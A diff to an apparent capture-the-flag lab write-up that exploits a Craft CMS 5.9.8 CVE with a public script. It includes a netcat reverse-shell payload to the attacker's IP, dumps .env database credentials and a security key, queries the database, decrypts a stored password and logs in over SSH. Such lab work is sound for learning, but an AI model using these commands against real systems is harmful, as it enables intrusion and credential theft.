@@ -144,6 +144,96 @@ i found
 
 > ### notice `Craft cms version solo 5.9.8` i searched for CVES for this version 
 
+## found [CVE-2026-28695](https://github.com/predyy/CVE-2026-28695)
 
 
+```
+python3 exp.py -t http://portal.international.htb -u jenny -p 'Fl1ghtDeck2026!' -c 'busybox nc 10.13.37.182 4444 -e /bin/sh'
+```
+
+<img width="965" height="102" alt="image" src="https://github.com/user-attachments/assets/669afa77-91ad-4dfc-a358-d598a95d37b6" />
+
+### bingo 🫣🚩
+
+<img width="1115" height="334" alt="image" src="https://github.com/user-attachments/assets/78a1ee6a-2bbb-42d3-a0da-ef2fb827fc53" />
+
+## in `/portal` found 
+
+```
+drwxr-xr-x  8   197108   197121   4096 Sep  9 16:17 .
+drwxr-xr-x  4   197108   197121   4096 Sep 23 13:14 ..
+-rw-r--r--  1 www-data www-data    753 Aug 10 18:37 .env
+-rw-r--r--  1 www-data www-data    411 May 13 23:11 .env.example.dev
+-rw-r--r--  1 www-data www-data    623 May 13 23:11 .env.example.production
+-rw-r--r--  1 www-data www-data    619 May 13 23:11 .env.example.staging
+-rw-r--r--  1 www-data www-data     31 May 13 23:11 .gitignore
+-rw-r--r--  1 www-data www-data    553 May 13 23:11 bootstrap.php
+-rw-r--r--  1 www-data www-data    630 Aug 11 13:29 composer.json
+-rw-r--r--  1 www-data www-data 314414 Jul 15 21:17 composer.lock
+drwxr-xr-x  4   197108   197121   4096 Aug 11 13:29 config
+-rwxr-xr-x  1 www-data www-data    309 May 13 23:11 craft
+drwxr-xr-x  3 www-data www-data   4096 Aug 11 13:29 modules
+
+```
+
+## i found credentials  in `.env` for DB and secrity key 
+
+
+<img width="997" height="369" alt="image" src="https://github.com/user-attachments/assets/f7f8d234-7407-40c1-b5dc-63da553e503a" />
+
+```
+# General settings
+CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
+CRAFT_DEV_MODE=false
+CRAFT_ALLOW_ADMIN_CHANGES=false
+CRAFT_DISALLOW_ROBOTS=true
+
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craft
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftDB_pw_2026
+CRAFT_DB_TABLE_PREFIX=
+
+```
+
+## connect to DB 
+
+```
+mysql -u craftuser -pCraftDB_pw_2026 craft
+SELECT * FROM htbairways_settings;
+```
+
+
+<img width="1106" height="400" alt="image" src="https://github.com/user-attachments/assets/7a03d87f-196a-4775-a9b2-48e5f88e1027" />
+
+
+## we will use `CRAFT_SECURITY_KEY` that we found and `vendor/autoload.php` to decrypt it
+
+```
+cd /var/www/portal
+php -r "
+require 'vendor/autoload.php';
+\$security = new \yii\base\Security();
+echo \$security->decryptByKey(
+    base64_decode('u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w='),
+    'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr'
+);
+"
+```
+
+
+<img width="1018" height="306" alt="image" src="https://github.com/user-attachments/assets/4a334cb0-6a74-4f72-b7fb-8fca8fc82137" />
+
+
+
+## now we have the password of user `aporter`
+
+
+```
+ssh aporter@10.13.37.10
+```
+
+<img width="1113" height="358" alt="image" src="https://github.com/user-attachments/assets/9d59140c-e468-411a-a973-b8adebc562fc" />
 
